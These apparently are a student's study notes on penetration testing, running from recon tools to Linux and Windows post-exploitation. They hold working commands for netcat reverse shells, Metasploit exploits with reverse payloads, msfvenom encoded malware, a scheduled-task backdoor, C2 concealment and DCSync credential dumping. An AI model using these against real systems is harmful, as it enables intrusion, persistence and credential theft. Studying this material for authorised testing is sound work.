Penetration Testing
	: often referred to as pen testing or ethical hacking, is the offensive security practice of attacking a network using the same techniques that a milicious hacker would use, in an effort to identify security holes and raise awareness within an organization.
		_often referred to as  an engagement by practitioners, this engagement agreement will grant permission and scope for the testing against the company._
Pentesting phases
	1. Planning - _Define the purpose and scope of the test, and sign all legal contracts._
	2. Reconnaissance - _Obtain publicly available infromation about your target._
	3. Scanning - _Use tools to run a scan against your target to gather information, such as open ports, and run services to determine portential vulnerablilities_
	4. Exploitation - _Attack the culnerabilities discovered in the previous steps in order to gain access to the target._
	5. Post Exploitation - _Gather valuable infromation from the compromised systems._
	6. Reporting - _Report on the previous five steps to provide a summary of actions taken, findings, and recommended mitigations._
#### Planning
Purpose
	: defined by the business's needs and which assets the business is most interested in protecting.
Scope
	: defined by which machines and networks are off limits to pentesters and should not be targeted for attack.
Types of Pentesting
	Black box
		No View
			- Paid to learn and exploit as much as they can about the network using only the tools publicly available to an attacker on the internet.
			- The tester may only know the comany name and have to find various key resources, like IP ranges/access credentials.
	White box
		Full View
			- knowledge allows them to tear apart subtle security issues on behalf of their clients.
			- client wants a detailed analysis of all potential security flaws, rather than explosed and visible vulnerabilities.
			- testers are given network diagrams, access credentials to the networks, system names, usernames, emails and phone numbers.
	Grey Box
		Partial View
			- Regardless of scenario, the main deliveerable for any pentester is a report that summarizes their findings and recommendations for improvements.
Statement of work (SOW)
	: outlines the scope of the test, the timeline, the points of contact, and how the test will be conducted.
---
#### MITRE ATT&CK matrix
Tactics / Headers
	- Each header represents a tactic.
	- The first tactic listed is reconnaissance because attacker conduct reconnaisssance on a target before acutally performing any exploitation.
---
#### Reconnaissance
	: gathering information about your target.
Passive Recon
	: often refers to open source intelligence (OSINT), which leverages information about the target that is publicly available on the internet.
Active Recon
	: refers to gathering information by directly interacting with the target
Google Dorking
	: manipulating Google searches to narrow down our queries in order to acquire actionable intel.
		_Dorks are inputted in a pair such that looks like **filter:value**_
			ex. site:sans.org | type:pdf | intext:password
Certificate Transparency
	: Cert issures publish logs of SSL/TLS certificates that they issue to organizations.
		_Attackers can exploit this transparency to search for subdomains._
			crt.sh
	MITRE : ID T1596.003
Shodan.io
	: conducts port scanning across the entire internet and catalogs the results for quick searching.
		_this saves us the time we would spend conducting a port scan. Not conducting the scan also allows us to keep our originating IP address hidden._
	MITRE : ID T1596.005
Recon-ng
	: a web reconnaissance framework written in Python.
```bash
recon-ng
	> modules search
	 	#observe recon modules
	> modules oad  recon/domains-hosts/hackertarget
	> info
	> options set SOURCE *website*
	> info
	> run
		 #observe no ports
	> modules load recon/hosts-ports/shodan_ip
	> keys add shodan_ap <KEY>
	> keys list
	> info
		 #observe help info on module
	 	 #source option
	> options set SOURCE default
	> run
		#observe ports identified
	> show ports
```
Useful Commands
```bash
help
exit
show hosts
db query delete from hosts
options set
info
back
modules search
modules load
```
### Initial Access & Internal Recon
Phishing
	the most common way an attacker gains access to the internal network.
		_common goals of phishing campaigns are targeting users to obtain credentials  or the email contains a malicious link that will install malware or a backdoor on the victim's computer._
	Telltale signs :
		Typos
			In the body of the email and the sender's email address are common flags.
		Typosquatting
			A common tactic in which an attacker will register a fraudulent domain similar to legitimate one. ex. Google.com // GoogIe.com
		Subdomains
			Are often registered to mimic real domains. ex. payments.google.com vs. paymentsgoogle.bogusdomain.com
Remote Services through Valid Accounts
	Valid accounts
		The attacker uses real user accounts to gain access.
	Remote Services
		attacker uses remote services such as VPN to try and gain access from outside of the target's network.
Password Guessing
	: the systematic method of guessing passwords to obtain access into a target.
#### Scanning
Internal Reconnaissance
	inside the network we will perform host enumeration and process enumeration as well as find information about the users on the network.
Vulnerability Scanning
	: scanners will attempt to log into systems using default passwords or other credentials in order to establish a more detailed picture of the network infrastructure.
Searchsploit
```bash
searchsploit -h
	#examples
	#options
searchsploit ftp remote file    #and/or keyword search
searchsploit -t oracle windows  #search by title
searchsploit linux kernel 4.4 --exclude="(PoC)/DCCP/"
searchsploit mysql 6.0 -w       #show website results
```
Exploitation with Shells
	Bind Shell
		remote host opens a port for the current host to connect to. The current, local host then connects to that remote host's port.
	Reverse Shell
		remote host connects back to a port on the local host.
Netcat
```bash
"REVERSE SHELL"
nc -h
#attacker
nc -lvp 4445
#victim, in another terminal
nc 127.0.0.1 4445 -e /bin/bash
#attacker
whoami

------------------------------------
"BIND SHELL"
#victim
nc -lvp 4445 -e /bin/bash
#attacker, in another terminal
nc 127.0.0.1 4445
whoami

```
#### Post Exoploitation
Command and Control (C2)
	: a framework that consists of tools and techniques that attackers use to amintain communication with compromised devices following initial exploitation.
		_written in variety of languages and have different targetting operating systems and protocols._
	C2 Architecture
		C2 Server
			: attacker's server, where the attacker communicates with the compromised machines.
		C2 Agent
			: payload that is run on compromised machine in order to open up a connection back to the C2 server.
	Concealing Methods
		1. Redirection through proxies
			Using burnable proxy servers will ensure the C2 server's IP isnt blocked by the target network and proxy servers can be spun up quickly to continue penetration.
		2. Utilizing multiple channels
			Using multiple protocols which are well known and widely used and/or not blocked by firewalls such as https/dns/http/tcp(arbitrary port/smb
		3. Utilizing multiple C2 frameworks
			Frameworks have their own fingerprints or indicators of compromise so we can thwart detection by using frameworks that a firewall or antivirus might not be able to detect.
Zombies/Botnets
	: a machine that has a C2 agent running on it and is therefore, compromised. Botnets refer to multiple of the zombies controlled by the same C2 server.
Metasploit
	: C2 framework that was created in 2003 and is owned by Rapid7, contains a suite of tools for hacking servers and other networked devices as well as port and service scanning. Integrated database all your scans are saved to for easy review.
		MSFconsole
			: main interface for Metasploit, offers a centralized console to access all the options and modules as a CLI
		Mterpreter
			: Linux style shell that metasploit launches when ou successfully break into a target machine. (runs on the machine you compromise)
		msfvenom
			: Allows the operator to craft the malicious agents and payloads that will be used to cmomunicate back with metasploit.
	Metasploit modules
	![[Pasted image 20221116164146.png]]
```bash
msfconsole
	> help
	> show auxiliary
	> show exploits
	> search frp/anonymous
	> use scanner/frp/anonymous
	> info
	> options
	> show advanced options
	> set RHOSTS 172.22.117.150
	> info
	> run
#vsftpd exploit
	> search vsftpd
	> use exploit/unix/ftp/vsftpd_234_backdoor
	> info
	> show advanced options
	> set RHOSTS 172.22.117.150
	> run #maybe a couple times
	> whoami
	> CTRL+Z -> yes
	> sessions
	> sessions 1
	> whoami
```
#### Post Exploitation
Enumeration and Useful data
	Similar to our first phase of reconnaissance except we are enumerating and searching for data from inside the network.
Persistence
	 attempting to maintain long-term access to your target.
PrivEsc (MITRE Tactic)
	process of escalating privleges from a low privileged user to a high privilege user.
		_landing on a user with low privileges is very  common so escalation becomes more and more important. think combatting lowest priveleged access._
Low priv tasks
	1. gathering system/OS details
	2. gathering services and versions
	3. Getting a list of users and groups.
High priv tasks
	1. Reading sensitive files such as /etc/shadow and SSH keys
	2. Creating users and assigning them to priveleged groups.
	3. Installing new services
	4. majority of persistence tasks
```bash
msfconsole
	> serach distc
	> use distcc_exec
	> set RHOSTS 172.22.117.150
	> show payloads
	> set payload cmd/unix/reverse
	> set LHOST 172.22.117.100
	> whoami
```
Performing High-Priv Escalation
	/var/lib/mysql/mysql/user.MYD
		Is the MySQL database file, which may contain SQL login credentials.
	/home/"user"/.bash_history
		Contains a history of a user's bash commands.
	/home/"user"/.ssh
		Contains private SSH keys.
Persistence
	: consists of techinques that adversaries use to keep access to sstems across restarts, changed credentials, and other interruptions that could cut off access
		Existing Services
			_using useradd to create a new user as a "backdoor"_
		Blending into the environment
			_blend in with current account names by using the name sysadmin or systemd-ssh to pose a service_
		Maintaining current level of Access
			*important to keep the highest privilege possible to avoid having to elevate again*
		Privesc Persistence
			*purposely establishing opportunities for low-privelege users to escalate their privileges*
___
### Windows Penetration Testing
Mitre Technique
	: how a specific tactic is carried out.
Ports and Protocols
	- SSH is a common port on a linux machine.
	- Windows relies on SMB (port 445) and Remote Desktop Protocol (port 3389) to be remotely accessed instead of SSH (22) like a linux box.
	- AD needs several ports open to properly communicate between the domain controller (DC) and workstations on the network.
	- Kerberos, the primary form of authentication in AD, uses port 88
		- Port 53
```bash
# Common Windows Ports
port 88 # Kerberos // AD Authentication
port 135 # RPC(WMI) // Remote Procedure Call (for process communication)
port 389 # LDAP // Lightweight Directory Access
port 445 # SMB // sharing files
port 3389 # RDP // Remote Desktop (usually used in lieu of SSH)
port 22 # commonly not open but not a sinking ship because SSH can be set to off on linux
```
Windows Authentication
	Kerberos
		: uses a ticketing system
			default protocol for authentication in Windows and is heavily used in Active Directory
			1. sends as-req
			2. KDC check password hash for match and encrypts/verifies
			3. as-rep grants TGT (ticket granting ticket)
	NTLM
		: "challenge response" protocol and uses a three step method:
		 1. Negotiation message from the client
		 2. Challenge message from the server
		 3. Authentication message from the client
	_backup if Kerberos is not available_
Password-Based Attacks
	Local passwords are stored in the SEcurity Account Manager (SAM) database. SAM = /etc/shadow
		_allows an attacker to **brute force**, or attempt to log in to an account by trying multiple passowrds_
	Local accounts, by default, wont be disabled from logging in to a bad password, howeveer, events are still generated by Windows for each failed login attempt, even for local accounts.
		Password Spraying
			: getting a list of usernames and attempting a single password for those accounts.
		1. SeasonYear
		2. variation "password"
		3. PresidentYear
		4. LetMeIn
		5. IloveYou
Local Link Multicast Name Resolution (LLMNR) 
	: older broadcast protocol that serves as a local backup for DNS.
		LLMNR poisoning
			1. attacker listens for LLMNR requests
			2. windows machine user tries to visit a network share that doesn't exist, or makes a typo trying to visit an existing one.
			3. The victim's computer asks the DNS server if it knows where the network share is. If it doesn't, the computer asks the DHCP.
Windows Exploitation and WMI
```PowerShell
**demo**
#get processes
Get-wmiobject Win32_process -computername windc01
$list = Get-wmiobject Win32_Process -computername windc01
$list.name #pulls the list variable with the name of each item in the list

#get services
get-wmiobject win32_service -computername windc01

#non wmic commands
tasklist          #lists processes
systeminfo        #lists system information
net session       #lists logged in users
net share         #lists shares
```
#### msfvenom
Payload
	: the shell code that runs when an exploit successfully compromises a system.
		_attackers build their own custom payloads that they include in phishing emails_
Countermeasure
	1. IDS/IPS
	2. AV solutions
```bash
msfvenom -l payloads    #list payloads
msfvenom -l formats     #list formats
msfvenom -l encoders    #list encoders
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe -o /tmp/malware.exe
#crafting a payload with x86 architecture, x86/shikata encoding, exe format into /tmp/malware.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST="my ip" LPORT=4444 -f exe R > hack.exe
```
#### meterpreter
Meterpreter
	similar to using a normal shell, but it has its own built-in commands and pen testting features. Almost like an extendable command shell.
		Common payloads are `windows/meterpreter/reverse_)tcp`
	`sessions -i 1 # connects to sessions`
Meterpreter commands
```bash
?
getuid
getwd
ifconfig
sysinfo
upload
download
search
run win_privs
run win_enum
```
Privelege Escalation
Users
	: default group that all new local users are added to.
Domain Users
	: default group that a new domain user is added to
Domain administrators
	: very high privileges in Active Directory, allows the modification of group policies, creation of users, ability to set permissionsl etc.
Administrators
	: local group for administrators, allowed to o create local users, assign them to local groups, reset passwords, etc.
MITRE technique T1543.003
	: create or modify sytsem process: Windows service
Process Migration/Injection
	: moving the active process of the C2 agent to another active process.
		_essentially allows a current process to "inject" or "migrate" its data into another process. The old process takes the name of the new, migrated, process_
	we can use this to conceal the identity of a C2 agent and moves it to a more stable process
Migrate Walkthrough
```bash
migrate         #shows syntax
ps              #shows active processes
# we must migrate to a process that does not interfere with core windows process. svchost.exe is a common usable process
migrate 3612    #takes us to process 3612
```
Windows Persistence
```bash
shell       #drops us into a cmd shell
schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"   #creates our task to execute our payload at midnight everyday
schtasks /run /tn Backdoor      #runs our task manually to test our task settings giving us a SUCCESS message back.
```
Windows Credentials Refresher
	: credentials stored in the Security Accounts Manager (SAM) database.
		_think /etc/shadow in linux for windows._
	This data base is stored within the Local Security Authority Subsystem Service (LSASS)
		Local account paswords are stored in the SAM whereas Domain accounts are not stored in the SAM but their credentials are stored in the registry
Mimikatz
	: Windows-purposed credential dumpng tool that is able to decrypt almost all stored credentials in Windows.
		_the metasploit version of Mimikatz is called **kiwi**_
Lateral movement
	: moving through the network from one machine to another.
		_these techniques often overlap with initial access techniques, as both tactics typicaly leverage the execution of code._
			1. remote services
			2. Remote Desktop Protocol
			3. Exploitation of Remote Services
			4. SMB/Windows Admin Shares
Credential Access
	Now that we have compromised the domain controllers we can try to gather data as multiple domain controllers work to stay redundant. Replicating this data from a domain controller is a reserved privilege for domain controller computer accounts or domain administrators.
		used to access these credentials on the NTDS.dit file however this technique is no longer applicable for Windows 10+/Server 2016+
	DCsync is the newer preferred technique for accessing password hashes on domain controllers.
DCSYNC Credential Access
``` bash
#system meterpreter
	ps
	getpid
	migrate <pid>
	shell
	shell> net users
	shell> exit
	load kiwi
	dcsync_ntlm tstark
```
